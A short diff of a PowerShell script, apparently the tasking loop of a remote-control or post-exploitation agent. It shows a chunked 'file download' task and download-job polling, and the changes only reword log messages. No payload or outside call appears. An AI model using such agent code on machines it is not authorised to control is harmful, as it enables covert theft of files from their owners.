@@ -994,7 +994,7 @@ function Get-FilePart {
             }
             # file download
             elseif($type -eq 41) {
-                "In download task"
+                Write-Host "In Download task"
                 try {
                     $ChunkSize = 512KB
 
@@ -1308,11 +1308,12 @@ function Get-FilePart {
             if(Get-DownloadJobCompleted -JobName $JobName) {
                 # the job has stopped, so receive results/cleanup
                 $Results = Stop-DownloadJob -JobName $JobName
-		Write-Host "Job $JobName complete: $($Results.Length)"                
+                Write-Host "Job $JobName complete: size - $($Results.Length)"
             }
             else {
                 $Results = Receive-DownloadJob -JobName $JobName
-                Write-Host "Job $JobName received: $($Results.Length)"
+                Write-Host "Job $JobName data received: size - $($Results.Length)"
+                
             }
 
             if($Results) {
